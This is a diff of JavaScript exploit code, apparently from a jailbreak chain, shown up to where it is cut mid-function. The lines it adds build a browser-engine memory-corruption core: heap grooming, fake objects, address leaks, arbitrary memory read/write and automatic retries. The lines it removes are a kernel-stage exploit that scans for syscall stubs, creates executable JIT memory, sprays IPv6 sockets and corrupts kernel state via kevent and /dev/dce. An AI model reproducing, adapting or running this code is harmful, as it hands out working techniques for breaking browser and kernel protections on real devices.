@@ -1,401 +1,1711 @@
-import { int64 } from "./int64.js";
-import { HX1400_TABLES } from "./hx_tables.js";
+let DRAIN_COUNT = 512;
+const AUTO_RETRY_DELAY_MS = 50;
 
-const T = HX1400_TABLES;
-const P = T.P;
+const K = 2;
+const DUPLICATE_INDEX = 2;
+const CONTROL_INDEX = 0xffff;
+const CONTROL_INT = -64000;
+const FILLER_BIGINTS = K - 1;
+const FILLER_OBJECTS = 0xfffe - K;
+const EXPECTED_LENGTH = 0x50001;
+const CELL_BYTES = 0x30;
+const FUNCTION_BYTES = 0x20;
+const NATIVE_EXECUTABLE_BYTES = 0x38;
+const HOLDER_BYTES = 0x40;
 
-const NUM = {
-  close: 6, open: 5,
-  socket: 97, socketpair: 135,
-  setsockopt: 105, getsockopt: 118,
-  kqueue: 362, kevent: 363,
-  mmap: 477, munmap: 73,
-  jitshm_create: 533,
+const HX1400_LIGHT_CORE =
+  new URLSearchParams(location.search).get("hx1400") === "1";
+
+const HX_MEM_LEVEL = (function () {
+  if (!HX1400_LIGHT_CORE) return 0;
+
+  try {
+    const q =
+      new URLSearchParams(location.search).get("mem");
+
+    const n =
+      parseInt(q || "2", 10);
+
+    if (
+      Number.isFinite(n) &&
+      n >= 1 &&
+      n <= 5
+    ) {
+      return n;
+    }
+  } catch (e) {}
+
+  return 2;
+})();
+
+const HX_MEM_PROFILES = [
+  null,
+
+  {
+    name: "mem1-balanced",
+    slots: 3000000,
+    drain: 48,
+    drainsz: 0x8000,
+    slab: 0x300000,
+    bfly: 0x60000,
+    sep: 0x8000,
+    early: 0x60000,
+    guard: 0x70000,
+    pred: 0x60000,
+    final: 0x60000,
+  },
+
+  {
+    name: "mem2-low",
+    slots: 1500000,
+    drain: 24,
+    drainsz: 0x8000,
+    slab: 0x200000,
+    bfly: 0x40000,
+    sep: 0x8000,
+    early: 0x40000,
+    guard: 0x50000,
+    pred: 0x40000,
+    final: 0x40000,
+  },
+
+  {
+    name: "mem3-verylow",
+    slots: 800000,
+    drain: 12,
+    drainsz: 0x4000,
+    slab: 0x100000,
+    bfly: 0x30000,
+    sep: 0x4000,
+    early: 0x30000,
+    guard: 0x40000,
+    pred: 0x30000,
+    final: 0x30000,
+  },
+
+  {
+    name: "mem4-minimum",
+    slots: 500000,
+    drain: 8,
+    drainsz: 0x4000,
+    slab: 0x100000,
+    bfly: 0x20000,
+    sep: 0x4000,
+    early: 0x20000,
+    guard: 0x30000,
+    pred: 0x20000,
+    final: 0x20000,
+  },
+
+  {
+    name: "mem5-extreme",
+    slots: 250000,
+    drain: 4,
+    drainsz: 0x4000,
+    slab: 0x10000,
+    bfly: 0x10000,
+    sep: 0x4000,
+    early: 0x10000,
+    guard: 0x18000,
+    pred: 0x10000,
+    final: 0x10000,
+  },
+];
+
+const HX_MEM =
+  HX_MEM_PROFILES[HX_MEM_LEVEL] || null;
+
+
+const CARRIER_SLOTS = (function () {
+  try {
+    const q = new URLSearchParams(location.search).get("slots");
+    const n = q ? parseInt(q, 10) : 0;
+    if (n >= 100000 && n <= 40000000) return n;
+  } catch (e) {}
+  return HX_MEM ? HX_MEM.slots : 12000000;
+})();
+const CARRIER_BYTES = CARRIER_SLOTS * 8;
+const CAPTURE_DELAY_MS = 50;
+const COMPOSE_DELAY_MS = 100;
+
+const symbolToString = Symbol.prototype.toString;
+
+const _gOverride = (function () {
+  const out = {};
+  try {
+    const q = new URLSearchParams(location.search).getAll("g");
+    for (const item of q) {
+      const [k, v] = item.split(":");
+      const n = v && v.startsWith("0x") ? parseInt(v, 16) : parseInt(v, 10);
+      if (k && n > 0) out[k] = n;
+    }
+  } catch (e) {}
+  return out;
+})();
+const _g = (name, dflt) =>
+  typeof _gOverride[name] === "number" ? _gOverride[name] : dflt;
+if (typeof _gOverride.drain === "number") {
+  DRAIN_COUNT = _gOverride.drain;
+} else if (HX_MEM) {
+  DRAIN_COUNT = HX_MEM.drain;
+}
+
+const DRAIN_SIZE = _g("drainsz", HX_MEM ? HX_MEM.drainsz : 0x10000);
+const SLAB_SIZE = _g("slab", HX_MEM ? HX_MEM.slab : 0x400000);
+const BUTTERFLY_HOLE_SIZE = _g("bfly", HX_MEM ? HX_MEM.bfly : 0x81000);
+const SEPARATOR_SIZE = _g("sep", HX_MEM ? HX_MEM.sep : 0x10000);
+const EARLY_HOLE_SIZE = _g("early", HX_MEM ? HX_MEM.early : 0x70000);
+const GUARD_SIZE = _g("guard", HX_MEM ? HX_MEM.guard : 0x90000);
+const PREDECESSOR_SIZE = _g("pred", HX_MEM ? HX_MEM.pred : 0x80000);
+const FINAL_HOLE_SIZE = _g("final", HX_MEM ? HX_MEM.final : 0x80000);
+
+const __CORE_MEM_ESTIMATED_BYTES =
+  CARRIER_BYTES +
+  DRAIN_COUNT * DRAIN_SIZE +
+  SLAB_SIZE +
+  BUTTERFLY_HOLE_SIZE * 2 +
+  SEPARATOR_SIZE +
+  EARLY_HOLE_SIZE +
+  GUARD_SIZE +
+  PREDECESSOR_SIZE +
+  FINAL_HOLE_SIZE;
+
+globalThis.__CORE_MEM_INFO =
+  Object.freeze({
+    hx1400: HX1400_LIGHT_CORE,
+    memLevel: HX_MEM_LEVEL,
+    profile:
+      HX_MEM ? HX_MEM.name : null,
+
+    slots: CARRIER_SLOTS,
+    carrierBytes: CARRIER_BYTES,
+
+    drainCount: DRAIN_COUNT,
+    drainSize: DRAIN_SIZE,
+
+    slabSize: SLAB_SIZE,
+    estimatedBytes:
+      __CORE_MEM_ESTIMATED_BYTES,
+  });
+
+
+const RW_BUFFER_SIZE = 0x100;
+
+const IDENT_OFFSET = 0x20;
+
+const LEAK_SLOT_INDEX = 2;
+const LEAK_SLOT_OFFSET = 0x10 + 8 * LEAK_SLOT_INDEX;
+
+const REVISION = "slopkit-core-1";
+const attemptKey = `${REVISION}:attempts`;
+
+const burstKey = `${REVISION}:burst`;
+
+const rwHeader = new Uint8Array(CELL_BYTES);
+const targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
+const holderHeader = new Uint8Array(HOLDER_BYTES);
+const scratchBits = new ArrayBuffer(8);
+const scratchBytes = new Uint8Array(scratchBits);
+const scratchWords = new Uint32Array(scratchBits);
+const scratchDouble = new Float64Array(scratchBits);
+
+const identityMagic = new Uint8Array([
+  0x5a, 0xa5, 0xc3, 0x3c, 0xde, 0xad, 0xbe, 0xef,
+]);
+const identityBytes = new Uint8Array(8);
+
+let attemptNumber = 0;
+let attemptCeiling = 0;
+let keepIndex = 0;
+let stopped = false;
+let keepAlive = null;
+let onEvent = null;
+let criticalBarrier = null;
+let settleResolve = null;
+let settleReject = null;
+let running = false;
+
+let referenceTarget = null;
+let rwBuffer = null;
+let rwView = null;
+let rwMirror = null;
+let targetBuffer = null;
+let targetView = null;
+const nativeTarget = parseInt;
+let fakeHost = null;
+let lengthWord = null;
+let anchorElement = null;
+let markerObjectA = null;
+let markerObjectB = null;
+let targetHolder = null;
+let holderGuardA = null;
+let holderGuardB = null;
+let fillerGraph = null;
+let outerGraph = null;
+
+let leakedScope = null;
+let getterCarrier = null;
+let preparedSymbolObject = null;
+let capturedString = null;
+let capturedWords = null;
+let copiedLength = 0;
+let captureState = 0;
+let captureError = null;
+let hostAddress = NaN;
+let fakeAddress = NaN;
+
+let predecessorWords = null;
+let pointerLow = 0;
+let pointerHigh = 0;
+let targetAddress = NaN;
+let targetAddressLow = 0;
+let targetAddressHigh = 0;
+let nativeTargetAddress = NaN;
+let anchorElementAddress = NaN;
+let markerAAddress = NaN;
+let markerBAddress = NaN;
+
+let rwOriginalVector = NaN;
+let rwHeaderOK = false;
+let holderHeaderOK = false;
+let functionHeaderOK = false;
+let nativeExecutableHeaderOK = false;
+let functionStructureID = 0;
+let nativeExecutableStructureID = 0;
+let executableAddress = NaN;
+let nativeFunctionAddress = NaN;
+let nativeConstructorAddress = NaN;
+let pointersRepeated = false;
+let restoreObserved = false;
+let retrySafe = false;
+let retryScheduled = false;
+let attemptPersisted = false;
+let candidateEverReturned = false;
+let candidateMutationStarted = false;
+let zeroHeaderMiss = false;
+let identityResult = 0;
+
+let compositionState = 0;
+let compositionLength = 0;
+let compositionError = null;
+
+let liveCandidate = null;
+let fakeReleased = false;
+
+const UNSEEN = -1;
+const profile = {
+  carrierSID: UNSEEN,
+  carrierType: UNSEEN,
+  carrierFlags: UNSEEN,
+  carrierMode: UNSEEN,
+  carrierByte28: UNSEEN,
+  holderSID: UNSEEN,
+  holderType: UNSEEN,
+  holderFlags: UNSEEN,
+  functionSID: UNSEEN,
+  functionType: UNSEEN,
+  functionFlags: UNSEEN,
+  nativeExecSID: UNSEEN,
+  nativeExecType: UNSEEN,
+  nativeExecFlags: UNSEEN,
+  cellSize: UNSEEN,
+
+  vectorOffset: 0x10,
+  inlineSlotOffset: 0x10,
+  butterflyOffset: 0x08,
+  vectorOffsetMeasured: false,
 };
-const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
-const AF_INET6 = 28, SOCK_DGRAM = 2, AF_INET = 2, SOCK_STREAM = 1;
-const RTH_LEN = 248;
-const TPL_LO = 0x43434343;
-const TPL_HI = 0x54545454;
-const DEV_DCE = "/dev/dce";
-const OPS_OFF = 0x985a;
 
-// Exact 30 CANDS from Hx1400.java
-const CANDS = [128, 96, 160, 64, 192, 32, 224, 120, 136, 88, 104, 152, 168, 56, 72, 184, 200, 24, 40, 216, 232, 8, 16, 48, 80, 112, 144, 176, 208, 240];
-const ROUNDS = 6;
-
-const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false };
-
-function ctx() { return STATE.ctx; }
-function log(tag, detail) { ctx().mark(tag, detail === undefined ? "" : String(detail)); }
-function fin(msg) { log("FIN", msg); throw new Error("fin: " + msg); }
-function h16(v) {
-  if (typeof v === "bigint") return "0x" + v.toString(16);
-  if (v instanceof int64) return "0x" + ((BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0)).toString(16).padStart(16, "0");
-  return "0x" + (v < 0 ? (v >>> 0).toString(16) : Number(v).toString(16));
+function resetProfile() {
+  profile.carrierSID = UNSEEN;
+  profile.carrierType = UNSEEN;
+  profile.carrierFlags = UNSEEN;
+  profile.carrierMode = UNSEEN;
+  profile.carrierByte28 = UNSEEN;
+  profile.holderSID = UNSEEN;
+  profile.holderType = UNSEEN;
+  profile.holderFlags = UNSEEN;
+  profile.functionSID = UNSEEN;
+  profile.functionType = UNSEEN;
+  profile.functionFlags = UNSEEN;
+  profile.nativeExecSID = UNSEEN;
+  profile.nativeExecType = UNSEEN;
+  profile.nativeExecFlags = UNSEEN;
 }
-function num(v) {
-  if (typeof v === "bigint") return v;
-  if (v instanceof int64) return (BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0);
-  return BigInt(v >>> 0);
-}
-function toI64(v) {
-  if (v instanceof int64) return v;
-  v = BigInt(v);
-  return new int64(Number(v & 0xffffffffn) >>> 0, Number((v >> 32n) & 0xffffffffn) >>> 0);
-}
-function ka(rva) { return STATE.kbase + BigInt(rva >>> 0); }
 
-const ARENAS = [];
-function allocBuf(size) {
-  const c = ctx();
-  const ab = new ArrayBuffer(size);
-  c.keepAlive.push(ab);
-  const dv = new DataView(ab);
-  ARENAS.push({ ab, dv, addr: num(c.bufAddr(ab)) });
-  return ARENAS[ARENAS.length - 1];
+function hex(value) {
+  return `0x${value.toString(16)}`;
 }
-function zeroBuf(buf) { new Uint8Array(buf.ab).fill(0); }
 
-let SCAN_SEEN = 0;
+function buffer(size) {
+  return new ArrayBuffer(size);
+}
 
-function findStubRaw(snum) {
-  const p = ctx().p;
-  const base = num(ctx().libkernelBase);
-  const want = snum >>> 0;
-  const LIMIT = 0x80000;
-  for (let off = 0; off < LIMIT; off += 4) {
-    const w = p.read4(toI64(base + BigInt(off))) >>> 0;
-    if ((w & 0x00ffffff) !== 0xc0c748) continue;
-    const b3 = p.read1(toI64(base + BigInt(off + 4)));
-    const b4 = p.read1(toI64(base + BigInt(off + 5)));
-    const b5 = p.read1(toI64(base + BigInt(off + 6)));
-    const imm = (((w >>> 24) & 0xff) | (b3 << 8) | (b4 << 16) | (b5 << 24)) >>> 0;
-    let isStub = false;
-    for (let k = 7; k <= 15; k++) {
-      if (p.read1(toI64(base + BigInt(off + k))) === 0x0f &&
-          p.read1(toI64(base + BigInt(off + k + 1))) === 0x05) {
-        isStub = true;
-        break;
+function allZero(bytes, start, end) {
+  for (let i = start; i < end; ++i) {
+    if (bytes[i] !== 0) return false;
+  }
+  return true;
+}
+
+function uint32At(bytes, offset) {
+  return (
+    bytes[offset] +
+    bytes[offset + 1] * 0x100 +
+    bytes[offset + 2] * 0x10000 +
+    bytes[offset + 3] * 0x1000000
+  );
+}
+
+function low48At(bytes, offset) {
+  return (
+    bytes[offset] +
+    bytes[offset + 1] * 0x100 +
+    bytes[offset + 2] * 0x10000 +
+    bytes[offset + 3] * 0x1000000 +
+    bytes[offset + 4] * 0x100000000 +
+    bytes[offset + 5] * 0x10000000000
+  );
+}
+
+function readBytes(destination, source, count) {
+  for (let i = 0; i < count; ++i) destination[i] = source[i];
+}
+
+function sameBytes(left, right, count) {
+  for (let i = 0; i < count; ++i) {
+    if (left[i] !== right[i]) return false;
+  }
+  return true;
+}
+
+function readTwiceMatches(destination, source, count) {
+  readBytes(destination, source, count);
+  return sameBytes(destination, source, count);
+}
+
+function aimCarrier(candidate, address) {
+  const high = Math.floor(address / 0x100000000);
+  scratchWords[0] = address - high * 0x100000000;
+  scratchWords[1] = high;
+  for (let i = 0; i < 8; ++i) candidate[0x10 + i] = scratchBytes[i];
+}
+
+function restoreCarrier(candidate) {
+  for (let i = 0; i < 8; ++i) candidate[0x10 + i] = rwHeader[0x10 + i];
+}
+
+function pointerFromWords(words, offset) {
+  if (words[offset + 3] !== 0) return NaN;
+  return (
+    words[offset] +
+    words[offset + 1] * 0x10000 +
+    words[offset + 2] * 0x100000000
+  );
+}
+
+function plausibleCell(value) {
+  return (
+    value > 0x100000000 &&
+    value <= 0xffffffffffff &&
+    value <= 9007199254740991 &&
+    Math.floor(value) === value &&
+    value % 8 === 0
+  );
+}
+
+function plausibleAddress(value) {
+  return (
+    value > 0x100000000 &&
+    value <= 0xffffffffffff &&
+    value <= 9007199254740991 &&
+    Math.floor(value) === value
+  );
+}
+
+function canonicalLow48(bytes, offset) {
+  return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
+}
+
+function dumpHex(bytes, count) {
+  let out = "";
+  for (let i = 0; i < count; ++i) out += bytes[i].toString(16).padStart(2, "0");
+  return out;
+}
+
+function encodedHeaderNumber() {
+  const raw = new ArrayBuffer(8);
+  const u32 = new Uint32Array(raw);
+  const f64 = new Float64Array(raw);
+  u32[0] = 0x00004250;
+  u32[1] = 0x01062800;
+  return f64[0];
+}
+
+function emit(tag, detail) {
+  if (onEvent === null) return;
+  try {
+    onEvent(tag, detail === undefined ? "" : String(detail), attemptNumber);
+  } catch {}
+}
+
+function checkCarrierIdentity(candidate) {
+  if (
+    !plausibleAddress(rwOriginalVector) ||
+    rwOriginalVector % 8 !== 0 ||
+    IDENT_OFFSET + 8 > RW_BUFFER_SIZE
+  )
+    return 0;
+  aimCarrier(candidate, rwOriginalVector + IDENT_OFFSET);
+  readBytes(identityBytes, rwView, 8);
+  restoreCarrier(candidate);
+  return sameBytes(identityBytes, identityMagic, 8) && rwView[0] === 0x3c
+    ? 1
+    : -1;
+}
+
+function runIdentityProof(candidate) {
+  candidateMutationStarted = true;
+  identityResult = checkCarrierIdentity(candidate);
+  return identityResult === 1;
+}
+
+function ceilingReached() {
+  return attemptCeiling > 0 && attemptNumber >= attemptCeiling;
+}
+
+function giveUp(reason) {
+  stopped = true;
+  emit("CORE-GIVE-UP", `reason=${reason}-attempts=${attemptNumber}`);
+  const reject = settleReject;
+  settleResolve = null;
+  settleReject = null;
+  running = false;
+  if (reject !== null)
+    reject(
+      new Error(`core: gave up after ${attemptNumber} attempts (${reason})`),
+    );
+}
+
+function failed() {
+  if (ceilingReached()) {
+    giveUp("attempt-ceiling");
+    return;
+  }
+  emit("AUTO-RETRY-AFTER-FAILURE", `attempt=${attemptNumber}`);
+  stopped = false;
+  retryScheduled = false;
+  setTimeout(() => {
+    try {
+      history.replaceState(null, "");
+    } catch {}
+    attemptNumber++;
+    startAttempt();
+  }, AUTO_RETRY_DELAY_MS);
+}
+
+function releaseAttemptAllocations() {
+  referenceTarget = null;
+  rwBuffer = null;
+  rwView = null;
+  rwMirror = null;
+  targetBuffer = null;
+  targetView = null;
+  fakeHost = null;
+  lengthWord = null;
+  anchorElement = null;
+  markerObjectA = null;
+  markerObjectB = null;
+  targetHolder = null;
+  holderGuardA = null;
+  holderGuardB = null;
+  fillerGraph = null;
+  outerGraph = null;
+  leakedScope = null;
+  getterCarrier = null;
+  preparedSymbolObject = null;
+  capturedString = null;
+  capturedWords = null;
+  predecessorWords = null;
+  keepAlive = null;
+  try {
+    history.replaceState(null, "");
+  } catch {}
+  if (typeof globalThis.gc === "function") {
+    try {
+      globalThis.gc();
+    } catch {}
+  }
+}
+
+function scheduleSafeRetry(reason) {
+  if (retryScheduled || stopped) return;
+  const candidateStateSafe =
+    !candidateEverReturned || (zeroHeaderMiss && !candidateMutationStarted);
+
+  if (
+    !retrySafe ||
+    !candidateStateSafe ||
+    candidateMutationStarted ||
+    !attemptPersisted
+  ) {
+    emit(
+      "AUTO-RETRY-NOT-SCHEDULED",
+      `reason=${reason}` +
+        `-safe=${retrySafe}` +
+        `-candidate-seen=${candidateEverReturned}` +
+        `-candidate-mutated=${candidateMutationStarted}` +
+        `-candidate-state-safe=${candidateStateSafe}` +
+        `-attempt-persisted=${attemptPersisted}`,
+    );
+    failed();
+    return;
+  }
+  if (ceilingReached()) {
+    giveUp("attempt-ceiling");
+    return;
+  }
+
+  retryScheduled = true;
+  const nextAttempt = attemptNumber + 1;
+  emit("AUTO-RETRY-SCHEDULED", `reason=${reason}-next-attempt=${nextAttempt}`);
+  releaseAttemptAllocations();
+  setTimeout(
+    () => {
+      const candidateStillSafe =
+        !candidateEverReturned || (zeroHeaderMiss && !candidateMutationStarted);
+      if (
+        !retrySafe ||
+        !candidateStillSafe ||
+        candidateMutationStarted ||
+        stopped
+      ) {
+        emit(
+          "AUTO-RETRY-CANCELLED",
+          `reason=${reason}` +
+            `-retry-safe=${retrySafe}` +
+            `-candidate-safe=${candidateStillSafe}` +
+            `-candidate-mutated=${candidateMutationStarted}`,
+        );
+        failed();
+        return;
       }
-    }
-    if (!isStub) continue;
-    SCAN_SEEN++;
-    if (imm === want) return base + BigInt(off);
-  }
-  return null;
+
+      attemptNumber = nextAttempt;
+      startAttempt();
+    },
+    Math.max(AUTO_RETRY_DELAY_MS, 750),
+  );
 }
 
-function synthStub(targetNum) {
-  const donorNum = NUM.close !== targetNum ? NUM.close : NUM.socket;
-  const daddr = num(ctx().stubAddr.get(donorNum));
-  const p = ctx().p;
-
-  if (p.read1(toI64(daddr)) !== 0x48 || p.read1(toI64(daddr + 1n)) !== 0xc7 || p.read1(toI64(daddr + 2n)) !== 0xc0) {
-    return { err: "donor not 48 c7 c0" };
-  }
-  const donorImm = (
-    p.read1(toI64(daddr + 3n)) |
-    (p.read1(toI64(daddr + 4n)) << 8) |
-    (p.read1(toI64(daddr + 5n)) << 16) |
-    (p.read1(toI64(daddr + 6n)) << 24)
-  ) >>> 0;
-  if (donorImm !== donorNum) return { err: "donor imm mismatch" };
-
-  let jfd = scn("jitshm_create", 0, 16384, 7);
-  let usedName = false;
-  if (jfd < 0) {
-    const nb = allocBuf(32);
-    zeroBuf(nb);
-    jfd = scn("jitshm_create", nb.addr, 16384, 7);
-    usedName = true;
-  }
-  if (jfd < 0) return { err: "jitshm_create rc=" + jfd };
-
-  const m = scn64("mmap", 0, 16384, 7, 1, jfd, 0);
-  const addr = (BigInt(m.hi >>> 0) << 32n) | BigInt(m.lo >>> 0);
-  if (addr < 0x10000n) return { err: "mmap jit rc=" + m.i32 };
-
-  for (let o = 0; o < 32; o += 4) {
-    p.write4(toI64(addr + BigInt(o)), p.read4(toI64(daddr + BigInt(o))) >>> 0);
-  }
-  const w1 = ((((targetNum & 0xff) << 24) >>> 0) | 0x00c0c748) >>> 0;
-  p.write4(toI64(addr), w1);
-  const tailByte0 = p.read1(toI64(daddr + 7n));
-  const w2 = (((targetNum >>> 8) & 0xff) | (((targetNum >>> 16) & 0xff) << 8) | (((targetNum >>> 24) & 0xff) << 16) | (tailByte0 << 24)) >>> 0;
-  p.write4(toI64(addr + 4n), w2);
-
-  log("NATIVES-SYNTH", "num=" + targetNum + " donor=" + donorNum + " jfd=" + jfd + " rwx=" + h16(addr));
-  return { addr };
+function finishEarlySafeAttempt(tag, extra, reason) {
+  retrySafe = true;
+  emit(
+    tag,
+    `${extra}-retry-safe=true-candidate-seen=false` +
+      "-candidate-mutated=false",
+  );
+  scheduleSafeRetry(reason);
 }
 
-function ensureStubs() {
-  let missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
-  for (const k of missing) {
-    const addr = findStubRaw(NUM[k]);
-    if (addr !== null) {
-      ctx().stubAddr.set(NUM[k], toI64(addr));
-      log("NATIVES-RESCAN", k + "=" + NUM[k] + "@0x" + addr.toString(16));
-    }
+function resetAttemptState() {
+  referenceTarget = null;
+  rwBuffer = null;
+  rwView = null;
+  rwMirror = null;
+  targetBuffer = null;
+  targetView = null;
+  fakeHost = null;
+  lengthWord = null;
+  anchorElement = null;
+  markerObjectA = null;
+  markerObjectB = null;
+  targetHolder = null;
+  holderGuardA = null;
+  holderGuardB = null;
+  fillerGraph = null;
+  outerGraph = null;
+  leakedScope = null;
+  getterCarrier = null;
+  preparedSymbolObject = null;
+  capturedString = null;
+  capturedWords = null;
+  copiedLength = 0;
+  captureState = 0;
+  captureError = null;
+  hostAddress = NaN;
+  fakeAddress = NaN;
+  predecessorWords = null;
+  keepAlive = new Array(DRAIN_COUNT + 3);
+  keepIndex = 0;
+  pointerLow = 0;
+  pointerHigh = 0;
+  targetAddress = NaN;
+  targetAddressLow = 0;
+  targetAddressHigh = 0;
+  nativeTargetAddress = NaN;
+  anchorElementAddress = NaN;
+  markerAAddress = NaN;
+  markerBAddress = NaN;
+  rwOriginalVector = NaN;
+  rwHeaderOK = false;
+  holderHeaderOK = false;
+  functionHeaderOK = false;
+  nativeExecutableHeaderOK = false;
+  functionStructureID = 0;
+  nativeExecutableStructureID = 0;
+  executableAddress = NaN;
+  nativeFunctionAddress = NaN;
+  nativeConstructorAddress = NaN;
+  pointersRepeated = false;
+  restoreObserved = false;
+  retrySafe = false;
+  retryScheduled = false;
+  candidateEverReturned = false;
+  candidateMutationStarted = false;
+  zeroHeaderMiss = false;
+  identityResult = 0;
+  identityBytes.fill(0);
+  compositionState = 0;
+  compositionLength = 0;
+  compositionError = null;
+  liveCandidate = null;
+  resetProfile();
+  rwHeader.fill(0);
+  targetHeader.fill(0);
+  holderHeader.fill(0);
+}
+
+function startAttempt() {
+  if (fakeReleased) return;
+  if (stopped) return;
+  resetAttemptState();
+  try {
+    sessionStorage.setItem(attemptKey, String(attemptNumber));
+    attemptPersisted =
+      sessionStorage.getItem(attemptKey) === String(attemptNumber);
+  } catch {}
+  emit(
+    "ATTEMPT-START",
+    `attempt-persisted=${attemptPersisted}` +
+      `-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`,
+  );
+  try {
+    buildAndStoreGraph();
+
+    for (let i = 0; i < 8; ++i) rwView[IDENT_OFFSET + i] = identityMagic[i];
+    prepareAddrof();
+  } catch (error) {
+    finishEarlySafeAttempt(
+      "SETUP-THREW",
+      `${error?.name}:${String(error?.message).slice(0, 80)}`,
+      "setup-threw",
+    );
   }
-  log("NATIVES-SCANCOUNT", "saw " + SCAN_SEEN + " stubs in 512KB");
-  missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
-  for (const k of missing) {
-    const r = synthStub(NUM[k]);
-    if (r.addr !== undefined) ctx().stubAddr.set(NUM[k], toI64(r.addr));
-    else log("SYNTH-FAIL", k + ": " + r.err);
-  }
-  const still = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
-  if (still.length) fin("stubs missing: " + still.map((k) => k + "=" + NUM[k]).join(" "));
 }
 
-function scn(name, a, b, c, d, e, f) {
-  const n = NUM[name];
-  const stub = ctx().stubAddr.get(n);
-  if (!stub) fin("stub missing: " + name + " (" + n + ")");
-  return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]).i32;
-}
-
-function scn64(name, a, b, c, d, e, f) {
-  const n = NUM[name];
-  const stub = ctx().stubAddr.get(n);
-  if (!stub) fin("stub missing: " + name + " (" + n + ")");
-  return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]);
-}
-
-function buildTemplate() {
-  const tpl = allocBuf(512);
-  zeroBuf(tpl);
-  tpl.dv.setUint8(1, 30);
-  tpl.dv.setUint8(3, 15);
-  for (let off = 8; off + 8 <= RTH_LEN; off += 8) {
-    tpl.dv.setUint32(off, TPL_LO, true);
-    tpl.dv.setUint32(off + 4, TPL_HI, true);
-  }
-  return tpl;
-}
-
-function disarm(fd) { return scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0, 0); }
-function rearm(fd, tpl) { return scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, tpl.addr, RTH_LEN, 0); }
-
-function marked(fd, rdb, lenp) {
-  zeroBuf(rdb);
-  lenp.dv.setUint32(0, RTH_LEN, true);
-  lenp.dv.setUint32(4, 0, true);
-  if (scn("getsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) return false;
-  if (lenp.dv.getUint32(0, true) !== RTH_LEN) return false;
-  return (rdb.dv.getUint32(8, true) >>> 0) === TPL_LO && (rdb.dv.getUint32(12, true) >>> 0) === TPL_HI;
-}
-
-function phaseSpray(N) {
-  const fds = [];
-  for (let i = 0; i < N; i++) {
-    const fd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
-    if (fd <= 0) break;
-    fds.push(fd);
-  }
-  if (fds.length < 128) fin("spray n=" + fds.length + " <128");
-  log("SPRAY", "sockets=" + fds.length);
-  const rth = allocBuf(512);
-  for (const fd of fds) {
-    scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rth.addr, RTH_LEN, 0);
-  }
-  log("ARMS", "armed=" + fds.length + " size=" + RTH_LEN);
-  return { fds, rth };
-}
-
-function phase2Leak(rootKq, fds) {
-  const rdb = allocBuf(512);
-  const lenp = allocBuf(8);
-  const cl = allocBuf(64);
-  const tpl = buildTemplate();
-  const dev = allocBuf(32);
-  zeroBuf(dev);
-  for (let i = 0; i < DEV_DCE.length; i++) dev.dv.setUint8(i, DEV_DCE.charCodeAt(i));
-
-  let target = -1, targetFd = -1, savedRound = 0, candIdx = -1;
-  let kva = -1n, pageVal = 0n;
-  let tries = 0;
-  let blind = 0;
-
-  for (let attempt = 1; attempt <= ROUNDS; attempt++) {
-    if (target >= 0) break;
-    log("KV-ATTEMPT", attempt + "/" + ROUNDS);
-    
-    for (const fd of fds) { if (fd !== -1) disarm(fd); }
-    for (const fd of fds) { if (fd !== -1) rearm(fd, tpl); }
-
-    for (let ci = 0; ci < CANDS.length && target < 0; ci++) {
-      const vi = CANDS[ci];
-      if (vi >= fds.length) continue;
-      const fd = fds[vi];
-      if (fd === -1) continue;
-      
-      if (!marked(fd, rdb, lenp)) continue;
-      if (disarm(fd) !== 0) continue;
-      
-      scn("close", fd);
-      fds[vi] = -1; 
-      
-      const dce = scn("open", dev.addr, 2, 0, 0, 0, 0); 
-      if (dce < 0) continue;
-      
-      const page = ((BigInt(dce) & 0xffffn) << 16n) | BigInt(OPS_OFF);
-      const pageInt = Number(page & 0xffffffffn) | 0;
-      tries++;
-
-      zeroBuf(cl);
-      cl.dv.setUint32(0, dce >>> 0, true);
-      cl.dv.setInt16(8, -18, true);
-      cl.dv.setInt16(10, 1, true);
-      cl.dv.setUint32(16, 90, true);
-      let rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
-      log("KV-PLANT", "cand=" + vi + " dce=" + dce + " page=" + h16(page) + " rc=" + rc);
-      
-      let joined = 0;
-      if (rc === 0) {
-        for (let j = 0; j < fds.length; j++) {
-          if (j === vi || fds[j] === -1) continue;
-          
-          zeroBuf(rdb);
-          lenp.dv.setUint32(0, RTH_LEN, true);
-          lenp.dv.setUint32(4, 0, true);
-          if (scn("getsockopt", fds[j], IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) continue;
-          const v8 = rdb.dv.getInt32(8, true);
-          const v12 = rdb.dv.getUint32(12, true) >>> 0;
-          if (v8 === pageInt && v12 === 0) {
-            joined++;
-            if (target < 0) { target = j; targetFd = fds[j]; }
-            log("KV-JOINED", "victim=" + j + " fd=" + fds[j] + " joined=" + joined);
-          } else if ((v8 >>> 0) === TPL_LO && v12 === TPL_HI) {
-            // still armed
-          } else {
-            rearm(fds[j], tpl);
-          }
-        }
-      }
-
-      if (target >= 0 && joined === 1) {
-        zeroBuf(cl);
-        cl.dv.setUint32(0, dce >>> 0, true);
-        cl.dv.setInt16(8, -18, true);
-        cl.dv.setInt16(10, 2, true);
-        rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
-        if (rc !== 0) { target = -1; targetFd = -1; log("KV-HELD-FAIL", "rc=" + rc); }
-        else {
